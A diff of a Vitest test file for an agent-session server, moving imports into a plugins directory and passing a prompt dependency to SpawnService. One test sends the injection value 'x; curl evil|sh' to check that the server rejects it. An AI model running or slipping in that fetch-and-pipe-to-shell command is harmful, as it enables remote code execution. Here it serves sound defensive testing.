@@ -1,18 +1,20 @@
 import { describe, it, expect } from 'vitest';
+import { render } from '../../src/prompts/index.js';
+const promptSeam = { render: (n: string, v?: Record<string, string>) => render(n, v), rawTemplate: () => '' };
 import { EventEmitter } from 'node:events';
 import type { ChildProcess } from 'node:child_process';
 import { openDb } from '../../src/store/db.js';
 import { SubagentRunnerPool } from '../../src/subagent/pool.js';
 import { TaskStore } from '../../src/store/taskStore.js';
 import { Readiness } from '../../src/store/readiness.js';
-import { MissionStore } from '../../src/store/missionStore.js';
+import { MissionStore } from '../../plugins/agents/src/store/missionStore.js';
 import { EventBus } from '../../src/api/sse.js';
 import type { ElowenEvent } from '../../src/api/sse.js';
 import { createServer } from '../../src/api/server.js';
 import { FakeTmuxDriver } from '../../src/tmux/fakeDriver.js';
-import { AgentStore } from '../../src/store/agentStore.js';
-import { SpawnService } from '../../src/spawn/spawn.js';
-import { MissionEngine } from '../../src/overseer/missionEngine.js';
+import { AgentStore } from '../../plugins/agents/src/store/agentStore.js';
+import { SpawnService } from '../../plugins/agents/src/spawn/spawn.js';
+import { MissionEngine } from '../../plugins/agents/src/overseer/missionEngine.js';
 import { FakeClock } from '../../src/shared/clock.js';
 import { ConfigStore } from '../../src/store/configStore.js';
 import { ProjectStore } from '../../src/store/projectStore.js';
@@ -146,7 +148,7 @@ it('POST /sessions with invalid exec returns 400 and spawns nothing', async () =
   const tmux = new FakeTmuxDriver();
   const app = createServer({
     tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
-    engine: null as any, spawn: new SpawnService({ tmux, agents: new AgentStore(db) }), tmux,
+    engine: null as any, spawn: new SpawnService({ prompts: promptSeam, tmux, agents: new AgentStore(db) }), tmux,
     project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db),
   });
   const res = await app.request('/sessions', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'elowen-1', exec: 'x; curl evil|sh' }) });
@@ -161,7 +163,7 @@ it('POST /sessions launches an agent on a task and marks it in_progress', async 
   const tmux = new FakeTmuxDriver();
   const app = createServer({
     tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
-    engine: null as any, spawn: new SpawnService({ tmux, agents: new AgentStore(db) }), tmux,
+    engine: null as any, spawn: new SpawnService({ prompts: promptSeam, tmux, agents: new AgentStore(db) }), tmux,
     project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db),
   });
   const res = await app.request('/sessions', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'elowen-1', exec: 'ollama-cloud/deepseek-v4-flash' }) });
@@ -185,7 +187,7 @@ it('POST /sessions refuses to launch into a shared checkout another agent alread
   const tmux = new FakeTmuxDriver();
   const app = createServer({
     tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
-    engine: null as any, spawn: new SpawnService({ tmux, agents: new AgentStore(db) }), tmux,
+    engine: null as any, spawn: new SpawnService({ prompts: promptSeam, tmux, agents: new AgentStore(db) }), tmux,
     project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db),
   });
   const res = await app.request('/sessions', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'elowen-1', exec: 'sonnet' }) });
@@ -201,7 +203,7 @@ it('GET /sessions tags each live session with its project from the agent store',
   const agents = new AgentStore(db);
   const app = createServer({
     tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
-    engine: null as any, spawn: new SpawnService({ tmux, agents }), tmux, agents,
+    engine: null as any, spawn: new SpawnService({ prompts: promptSeam, tmux, agents }), tmux, agents,
     project: { id: 7, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db),
   });
   await app.request('/sessions', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'elowen-1', exec: 'ollama-cloud/deepseek-v4-flash' }) });
@@ -236,7 +238,7 @@ it('POST /sessions rejects an exec disallowed by config', async () => {
   const tmux = new FakeTmuxDriver();
   const app = createServer({
     tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
-    engine: null as any, spawn: new SpawnService({ tmux, agents: new AgentStore(db) }), tmux,
+    engine: null as any, spawn: new SpawnService({ prompts: promptSeam, tmux, agents: new AgentStore(db) }), tmux,
     project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config,
   });
   const res = await app.request('/sessions', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'elowen-1', exec: 'codex:gpt-5.4' }) });
@@ -708,7 +710,7 @@ it('POST /sessions reverts the task to open when spawn.launch fails', async () =
   tasks.create({ id: 'elowen-s1', project_id: 1, title: 'T', description: 'd' });
   const tmux = new FakeTmuxDriver();
   tmux.spawn = async () => { throw new Error('tmux exploded'); };
-  const spawn = new SpawnService({ tmux, agents: new AgentStore(db) });
+  const spawn = new SpawnService({ prompts: promptSeam, tmux, agents: new AgentStore(db) });
   const bus = new EventBus();
   const events: ElowenEvent[] = []; bus.subscribe((e) => events.push(e));
   const app = createServer({
